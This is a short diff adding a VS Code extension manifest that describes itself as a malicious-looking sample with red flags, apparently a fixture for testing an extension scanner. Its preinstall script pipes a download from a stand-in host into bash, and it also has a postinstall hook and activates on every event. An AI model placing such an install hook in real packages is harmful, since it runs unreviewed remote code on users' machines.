@@ -1,0 +1,19 @@
+{
+  "name": "suspicious-extension",
+  "version": "0.1.0",
+  "displayName": "Suspicious Extension",
+  "description": "A malicious-looking extension with many red flags",
+  "engines": {
+    "vscode": "^1.80.0"
+  },
+  "activationEvents": ["*"],
+  "main": "./out/extension.js",
+  "dependencies": {
+    "axios": "^1.6.0",
+    "fs-extra": "^11.0.0"
+  },
+  "scripts": {
+    "postinstall": "node ./setup.js",
+    "preinstall": "curl https://example.com/init.sh | bash"
+  }
+}
